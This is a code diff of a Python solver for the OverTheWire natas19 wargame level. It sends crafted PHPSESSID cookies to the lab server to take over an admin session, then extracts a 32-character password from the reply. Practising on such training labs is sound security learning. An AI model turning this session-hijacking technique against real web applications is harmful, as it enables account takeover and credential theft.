@@ -8,9 +8,8 @@ fail_string = "You are logged in as a regular user. Login as an admin to retriev
 def inject_payload(pid):
     #Username and Password for natas website/level
     passw = subprocess.run(['getpass', '19'], stdout=subprocess.PIPE).stdout.decode('utf-8')
-    auth = HTTPBasicAuth('natas19', passw.strip())
     payload = {'PHPSESSID':pid}
-    r = requests.post('http://natas19.natas.labs.overthewire.org/', auth=auth, data={'username':'admin','password':'pass'}, cookies=payload)
+    r = requests.post('http://natas19.natas.labs.overthewire.org/', auth=HTTPBasicAuth('natas19',passw.strip()), data={'username':'admin','password':'pass'}, cookies=payload)
     passreg = '[a-zA-Z0-9]{32}'
     if fail_string not in r.text:
         print(re.findall(passreg, r.text)[1])
